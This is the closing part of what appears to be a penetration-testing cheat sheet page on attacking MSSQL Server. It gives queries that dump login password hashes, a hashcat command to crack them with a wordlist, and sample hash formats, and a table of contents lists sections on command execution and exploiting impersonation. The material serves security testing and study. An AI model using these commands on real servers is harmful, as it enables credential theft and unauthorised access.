</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">SYSTEM_USER</span>
</span></span></code></pre></div><h3 id="mssql-accounts-and-hashes">
  MSSQL Accounts and Hashes
  <a class="anchor" href="#mssql-accounts-and-hashes">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>MSSQL <span style="color:#ae81ff">2000</span>:
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> name, password <span style="color:#66d9ef">FROM</span> master..sysxlogins
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> name, master.dbo.fn_varbintohexstr(password) <span style="color:#66d9ef">FROM</span> master..sysxlogins (Need <span style="color:#66d9ef">to</span> <span style="color:#66d9ef">convert</span> <span style="color:#66d9ef">to</span> hex <span style="color:#66d9ef">to</span> <span style="color:#66d9ef">return</span> hashes <span style="color:#66d9ef">in</span> MSSQL error message <span style="color:#f92672">/</span> <span style="color:#66d9ef">some</span> <span style="color:#66d9ef">version</span> <span style="color:#66d9ef">of</span> query analyzer.)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>MSSQL <span style="color:#ae81ff">2005</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> name, password_hash <span style="color:#66d9ef">FROM</span> master.sys.sql_logins
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;-&#39;</span> <span style="color:#f92672">+</span> master.sys.fn_varbintohexstr(password_hash) <span style="color:#66d9ef">from</span> master.sys.sql_logins
</span></span></code></pre></div><p>Then crack passwords using Hashcat : <code>hashcat -m 1731 -a 0 mssql_hashes_hashcat.txt /usr/share/wordlists/rockyou.txt --force</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#ae81ff">131</span>	MSSQL (<span style="color:#ae81ff">2000</span>)	0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">132</span>	MSSQL (<span style="color:#ae81ff">2005</span>)	0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1731</span>	MSSQL (<span style="color:#ae81ff">2012</span>, <span style="color:#ae81ff">2014</span>)	0x02000102030434ea1b17802fd95ea6316bd61d2c94622ca3812793e8fb1672487b5c904a45a31b2ab4a78890d563d2fcf5663e46fe797d71550494be50cf4915d3f4d55ec375
</span></span></code></pre></div><h2 id="references">
  References
  <a class="anchor" href="#references">#</a>
</h2>
<ul>
<li><a href="https://medium.com/@D00MFist/powerupsql-cheat-sheet-sql-server-queries-40e1c418edc3">PowerUpSQL Cheat Sheet &amp; SQL Server Queries - Leo Pitt</a></li>
<li><a href="https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet">PowerUpSQL Cheat Sheet - Scott Sutherland</a></li>
<li><a href="https://blog.netspi.com/attacking-sql-server-clr-assemblies/">Attacking SQL Server CLR Assemblies - Scott Sutherland - July 13th, 2017</a></li>
<li><a href="https://www.optiv.com/explore-optiv-insights/blog/mssql-agent-jobs-command-execution">MSSQL Agent Jobs for Command Execution - Nicholas Popovich - September 21, 2016</a></li>
</ul>
</article>
 
      

      <footer class="book-footer">
        
  <div class="flex flex-wrap justify-between">


  <div><a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/commit/3579e9c4ae7712d4e8fcdd17b931224d3fca8a8d" title='Last modified by Stuart Gray | December 10, 2022' target="_blank" rel="noopener">
      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
      <span>December 10, 2022</span>
    </a>
  </div>




</div>



  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>


 
        
      </footer>

      
  
 

      <label for="menu-control" class="hidden book-menu-overlay"></label>
    </div>

    
    <aside class="book-toc">
      <div class="book-toc-content">
        
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#mssql-server">MSSQL Server</a>
      <ul>
        <li><a href="#identify-instances-and-databases">Identify Instances and Databases</a>
          <ul>
            <li><a href="#discover-local-sql-server-instances">Discover Local SQL Server Instances</a></li>
            <li><a href="#discover-domain-sql-server-instances">Discover Domain SQL Server Instances</a></li>
            <li><a href="#discover-remote-sql-server-instances">Discover Remote SQL Server Instances</a></li>
            <li><a href="#identify-encrypted-databases">Identify Encrypted databases</a></li>
            <li><a href="#version-query">Version Query</a></li>
          </ul>
        </li>
        <li><a href="#identify-sensitive-information">Identify Sensitive Information</a>
          <ul>
            <li><a href="#get-tables-from-a-specific-database">Get Tables from a Specific Database</a></li>
            <li><a href="#gather-5-entries-from-each-column">Gather 5 Entries from Each Column</a></li>
            <li><a href="#gather-5-entries-from-a-specific-table">Gather 5 Entries from a Specific Table</a></li>
            <li><a href="#dump-common-information-from-server-to-files">Dump common information from server to files</a></li>
          </ul>
        </li>
        <li><a href="#linked-database">Linked Database</a>
          <ul>
            <li><a href="#find-trusted-link">Find Trusted Link</a></li>
            <li><a href="#execute-query-through-the-link">Execute Query Through The Link</a></li>
            <li><a href="#crawl-links-for-instances-in-the-domain">Crawl Links for Instances in the Domain</a></li>
            <li><a href="#crawl-links-for-a-specific-instance">Crawl Links for a Specific Instance</a></li>
            <li><a href="#query-version-of-linked-database">Query Version of Linked Database</a></li>
            <li><a href="#execute-procedure-on-linked-database">Execute Procedure on Linked Database</a></li>
            <li><a href="#determine-names-of-linked-databases">Determine Names of Linked Databases</a></li>
            <li><a href="#determine-all-the-tables-names-from-a-selected-linked-database">Determine All the Tables Names from a Selected Linked Database</a></li>
            <li><a href="#gather-the-top-5-columns-from-a-selected-linked-table">Gather the Top 5 Columns from a Selected Linked Table</a></li>
            <li><a href="#gather-entries-from-a-selected-linked-column">Gather Entries from a Selected Linked Column</a></li>
          </ul>
        </li>
        <li><a href="#command-execution-via-xp_cmdshell">Command Execution via xp_cmdshell</a></li>
        <li><a href="#extended-stored-procedure">Extended Stored Procedure</a>
          <ul>
            <li><a href="#add-the-extended-stored-procedure-and-list-extended-stored-procedures">Add the extended stored procedure and list extended stored procedures</a></li>
          </ul>
        </li>
        <li><a href="#clr-assemblies">CLR Assemblies</a>
          <ul>
            <li><a href="#execute-commands-using-clr-assembly">Execute commands using CLR assembly</a></li>
            <li><a href="#manually-creating-a-clr-dll-and-importing-it">Manually creating a CLR DLL and importing it</a></li>
          </ul>
        </li>
        <li><a href="#ole-automation">OLE Automation</a>
          <ul>
            <li><a href="#execute-commands-using-ole-automation-procedures">Execute commands using OLE automation procedures</a></li>
          </ul>
        </li>
        <li><a href="#agent-jobs">Agent Jobs</a>
          <ul>
            <li><a href="#execute-commands-through-sql-agent-job-service">Execute commands through SQL Agent Job service</a></li>
            <li><a href="#list-all-jobs">List All Jobs</a></li>
          </ul>
        </li>
        <li><a href="#external-scripts">External Scripts</a></li>
        <li><a href="#python">Python:</a></li>
        <li><a href="#r">R</a></li>
        <li><a href="#audit-checks">Audit Checks</a>
          <ul>
            <li><a href="#find-and-exploit-impersonation-opportunities">Find and exploit impersonation opportunities</a></li>
          </ul>
        </li>
        <li><a href="#find-databases-that-have-been-configured-as-trustworthy">Find databases that have been configured as trustworthy</a></li>
        <li><a href="#manual-sql-server-queries">Manual SQL Server Queries</a>
          <ul>
            <li><a href="#query-current-user--determine-if-the-user-is-a-sysadmin">Query Current User &amp; determine if the user is a sysadmin</a></li>
            <li><a href="#current-role">Current Role</a></li>
            <li><a href="#current-db">Current DB</a></li>
            <li><a href="#list-all-tables">List all tables</a></li>
            <li><a href="#list-all-databases">List all databases</a></li>
            <li><a href="#all-logins-on-server">All Logins on Server</a></li>
            <li><a href="#all-database-users-for-a-database">All Database Users for a Database</a></li>
            <li><a href="#list-all-sysadmins">List All Sysadmins</a></li>
            <li><a href="#list-all-database-roles">List All Database Roles</a></li>
            <li><a href="#effective-permissions-from-the-server">Effective Permissions from the Server</a></li>
            <li><a href="#effective-permissions-from-the-database">Effective Permissions from the Database</a></li>
            <li><a href="#find-sql-server-logins-which-can-be-impersonated-for-the-current-database">Find SQL Server Logins Which can be Impersonated for the Current Database</a></li>
            <li><a href="#exploiting-impersonation">Exploiting Impersonation</a></li>
            <li><a href="#exploiting-nested-impersonation">Exploiting Nested Impersonation</a></li>
            <li><a href="#mssql-accounts-and-hashes">MSSQL Accounts and Hashes</a></li>
          </ul>
        </li>
        <li><a href="#references">References</a></li>
      </ul>
    </li>
  </ul>
</nav>


 
      </div>
    </aside>
    
  </main>

  
</body>
</html>












